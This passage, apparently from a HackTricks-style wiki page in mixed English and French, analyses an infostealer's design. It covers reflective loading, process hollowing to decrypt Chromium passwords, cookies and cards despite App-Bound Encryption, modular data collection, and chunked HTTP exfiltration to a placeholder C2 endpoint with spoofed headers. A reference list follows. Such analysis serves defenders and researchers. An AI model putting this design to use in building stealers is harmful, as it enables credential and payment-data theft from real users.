- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt mots de passe/cookies/cartes de crédit straight from SQLite databases despite ABE hardening.


### Collecte modulaire en mémoire & chunked HTTP exfil

- `create_memory_based_log` itère sur une table globale de pointeurs de fonctions `memory_generators` et crée un thread par module activé (Telegram, Discord, Steam, captures d'écran, documents, browser extensions, etc.). Chaque thread écrit les résultats dans des buffers partagés et rapporte son nombre de fichiers après une fenêtre de jointure d'environ 45s.
- Once finished, everything is zipped with the statically linked `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` then sleeps 15s and streams the archive in 10 MB chunks via HTTP POST to `http://<C2>:6767/upload`, spoofing a browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Each chunk adds `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, and the last chunk appends `complete: true` so the C2 knows reassembly is done.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
